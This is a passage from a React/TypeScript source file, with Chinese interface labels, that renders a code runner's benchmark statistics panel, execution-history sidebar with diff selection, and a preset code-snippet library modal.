        <button onClick={onReturnOutput} className="text-xs text-gray-500 hover:text-gray-300">← 返回输出</button>
      </div>

      <div className="grid grid-cols-2 gap-3 mb-4">
        <div className="rounded-lg p-3 border border-white/10 bg-white/5">
          <div className="text-xs text-gray-500 mb-1">最小耗时</div>
          <div className="text-lg font-bold text-green-400">{benchmarkResult.min.toFixed(0)}ms</div>
        </div>
        <div className="rounded-lg p-3 border border-white/10 bg-white/5">
          <div className="text-xs text-gray-500 mb-1">最大耗时</div>
          <div className="text-lg font-bold text-red-400">{benchmarkResult.max.toFixed(0)}ms</div>
        </div>
        <div className="rounded-lg p-3 border border-white/10 bg-white/5">
          <div className="text-xs text-gray-500 mb-1">平均耗时</div>
          <div className="text-lg font-bold text-blue-400">{benchmarkResult.avg.toFixed(0)}ms</div>
        </div>
        <div className="rounded-lg p-3 border border-white/10 bg-white/5">
          <div className="text-xs text-gray-500 mb-1">中位数</div>
          <div className="text-lg font-bold text-yellow-400">{benchmarkResult.median.toFixed(0)}ms</div>
        </div>
      </div>

      <div className="rounded-lg p-3 border border-white/10 bg-white/5 mb-4">
        <div className="flex justify-between text-xs mb-2">
          <span className="text-gray-400">成功率</span>
          <span className="text-gray-300 font-medium">{benchmarkResult.successRate.toFixed(1)}%</span>
        </div>
        <div className="flex justify-between text-xs mb-2">
          <span className="text-gray-400">标准差</span>
          <span className="text-gray-300 font-mono">{benchmarkResult.stddev.toFixed(2)}</span>
        </div>
        <div className="flex justify-between text-xs">
          <span className="text-gray-400">执行次数</span>
          <span className="text-gray-300 font-medium">{benchmarkResult.runs.length} 次</span>
        </div>
      </div>

      <div className="border border-white/5 rounded-lg overflow-hidden">
        <div className="px-3 py-2 bg-[#0d1520] border-b border-white/5">
          <span className="text-xs text-gray-400">各次执行耗时 (ms)</span>
        </div>
        <div className="p-3 max-h-32 overflow-auto font-mono text-xs text-gray-500">
          {benchmarkResult.runs.map((r, i) => (
            <span key={i} className="inline-block mr-3">
              [{i + 1}] {r.time.toFixed(0)}
            </span>
          ))}
        </div>
      </div>
    </div>
  );
};

// ===== 3. ExecutionHistory: 执行历史侧边栏 =====
const ExecutionHistory: React.FC<{
  show: boolean;
  history: HistoryEntry[];
  runtimes: Runtime[];
  diffLeft: HistoryEntry | null;
  diffRight: HistoryEntry | null;
  onLoad: (entry: HistoryEntry) => void;
  onClear: () => void;
  onSetDiffLeft: (entry: HistoryEntry) => void;
  onSetDiffRight: (entry: HistoryEntry) => void;
  onShowDiff: () => void;
}> = ({ show, history, runtimes, diffLeft, diffRight, onLoad, onClear, onSetDiffLeft, onSetDiffRight, onShowDiff }) => {
  if (!show) return null;
  const langIcon = (lang: string) => runtimes.find(r => r.id === lang)?.icon || '📄';
  return (
    <div className="w-72 border-l border-white/5 bg-[#0d1520] flex flex-col">
      <div className="flex items-center justify-between px-4 py-3 border-b border-white/5">
        <div className="flex items-center gap-2">
          <History size={14} className="text-gray-400" />
          <h4 className="text-sm font-semibold text-gray-200">执行历史</h4>
          <span className="text-xs text-gray-600">({history.length})</span>
        </div>
        <div className="flex gap-1">
          <button onClick={onShowDiff} disabled={!diffLeft || !diffRight}
            className="p-1.5 rounded text-gray-500 hover:text-gray-200 hover:bg-white/10 disabled:opacity-30" title="Diff 对比">
            <Columns2 size={14} />
          </button>
          <button onClick={onClear} disabled={history.length === 0}
            className="p-1.5 rounded text-red-500/70 hover:text-red-400 hover:bg-red-500/10 disabled:opacity-30" title="清空历史">
            <Trash2 size={14} />
          </button>
        </div>
      </div>

      <div className="flex-1 overflow-auto">
        {history.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-full text-gray-600 p-6 gap-2">
            <History size={20} className="opacity-40" />
            <span className="text-xs">暂无执行记录</span>
          </div>
        ) : (
          <div className="p-2 space-y-1">
            {history.slice().reverse().map((entry) => (
              <div key={entry.id}
                className={`rounded-lg p-2 border transition-all cursor-pointer hover:border-blue-400/30 ${
                  diffLeft?.id === entry.id ? 'bg-yellow-500/10 border-yellow-500/30' :
                  diffRight?.id === entry.id ? 'bg-cyan-500/10 border-cyan-500/30' :
                  'bg-[#0a0f18] border-white/5 hover:bg-[#0e1525]'
                }`}>
                <div className="flex items-center justify-between mb-1">
                  <div className="flex items-center gap-1.5">
                    <span className="text-sm">{langIcon(entry.language)}</span>
                    <span className="text-xs font-medium text-gray-300">{entry.language}</span>
                  </div>
                  <span className="text-[10px] text-gray-600">
                    {new Date(entry.timestamp).toLocaleTimeString()}
                  </span>
                </div>
                <p className="text-xs text-gray-500 font-mono truncate mb-2">{entry.code.substring(0, 50)}...</p>
                <div className="flex items-center justify-between">
                  <span className={`text-[10px] px-1.5 py-0.5 rounded ${entry.result.success ? 'bg-green-500/10 text-green-400' : 'bg-red-500/10 text-red-400'}`}>
                    {entry.result.success ? '成功' : `退出 ${entry.result.exitCode}`}
                  </span>
                  <span className="text-[10px] text-gray-600">{entry.result.executionTime}ms</span>
                </div>
                <div className="flex gap-1 mt-2 pt-2 border-t border-white/5">
                  <button onClick={() => onLoad(entry)}
                    className="flex-1 text-xs py-1 rounded bg-white/5 text-gray-400 hover:bg-white/10 hover:text-gray-200 transition-colors">
                    加载
                  </button>
                  <button onClick={() => onSetDiffLeft(entry)}
                    className={`text-xs px-2 py-1 rounded transition-colors ${diffLeft?.id === entry.id ? 'bg-yellow-500/20 text-yellow-400' : 'bg-white/5 text-gray-500 hover:bg-yellow-500/10 hover:text-yellow-400'}`}>
                    L
                  </button>
                  <button onClick={() => onSetDiffRight(entry)}
                    className={`text-xs px-2 py-1 rounded transition-colors ${diffRight?.id === entry.id ? 'bg-cyan-500/20 text-cyan-400' : 'bg-white/5 text-gray-500 hover:bg-cyan-500/10 hover:text-cyan-400'}`}>
                    R
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

// ===== 4. CodeSnippets: 代码片段库弹窗 =====
const CodeSnippets: React.FC<{
  show: boolean;
  onClose: () => void;
  language: string;
  languageIcon: string;
  snippets: Snippet[];
  categories: string[];
  selectedCategory: string | null;
  onCategoryChange: (cat: string | null) => void;
  onLoadSnippet: (snippet: Snippet) => void;
}> = ({ show, onClose, language, languageIcon, snippets, categories, selectedCategory, onCategoryChange, onLoadSnippet }) => {
  if (!show) return null;
  return (
    <AnimatePresence>
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
        className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
        onClick={onClose}>
        <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }}
          className="glass-card bg-[#111827] border border-white/10 rounded-2xl w-full max-w-3xl max-h-[85vh] overflow-hidden shadow-2xl"
          onClick={e => e.stopPropagation()}>
          <div className="flex items-center justify-between px-5 py-3 border-b border-white/10 bg-[#0d1520]">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-purple-400 to-pink-500 flex items-center justify-center">
                <Code size={16} className="text-black" />
              </div>
              <div>
                <h3 className="text-sm font-semibold text-gray-100">代码片段库 <span className="text-lg ml-1">{languageIcon}</span></h3>
                <p className="text-xs text-gray-500">{language} · {snippets.length} 个预置示例</p>
              </div>
            </div>
            <button onClick={onClose} className="p-2 rounded-full text-gray-400 hover:text-gray-200">
              <X size={18} />
            </button>
          </div>

          <div className="flex gap-2 px-5 py-3 border-b border-white/5 bg-[#0a0f18]/50 flex-wrap">
            <button onClick={() => onCategoryChange(null)}
              className={`text-xs px-3 py-1.5 rounded-full transition-colors ${
                !selectedCategory ? 'bg-blue-500/20 text-blue-400' : 'bg-white/5 text-gray-400 hover:bg-white/10'
              }`}>
              全部
            </button>
            {categories.map(cat => (
              <button key={cat} onClick={() => onCategoryChange(cat)}
                className={`text-xs px-3 py-1.5 rounded-full transition-colors ${
                  selectedCategory === cat ? 'bg-blue-500/20 text-blue-400' : 'bg-white/5 text-gray-400 hover:bg-white/10'
                }`}>
                {cat}
              </button>
            ))}
          </div>

          <div className="overflow-auto max-h-[55vh] p-4 space-y-2">
            {snippets.length === 0 ? (
              <div className="text-center py-8 text-gray-600">
                <p className="text-sm">当前语言暂无预置代码片段</p>
              </div>
            ) : snippets.map(snippet => (
              <div key={snippet.id} className="bg-[#0a0f18] rounded-lg border border-white/5 hover:border-blue-400/20 transition-all">
                <div className="flex items-start justify-between p-3 gap-3">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 mb-1">
                      <h4 className="text-sm font-medium text-gray-200">{snippet.title}</h4>
                      <span className="text-[10px] text-gray-600 bg-white/5 px-2 py-0.5 rounded">{snippet.category}</span>
                    </div>
                    <p className="text-xs text-gray-500 mb-2">{snippet.description}</p>
                    <pre className="text-xs font-mono bg-black/40 rounded p-2 text-gray-400 overflow-auto max-h-24 line-clamp-3">{snippet.code}</pre>
                  </div>
                  <button onClick={() => onLoadSnippet(snippet)}
                    className="flex-shrink-0 px-3 py-1.5 bg-blue-500/20 text-blue-400 rounded text-xs hover:bg-blue-500/30 transition-colors">
                    加载
                  </button>
                </div>
              </div>
            ))}
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
};

export default CodeRunner;
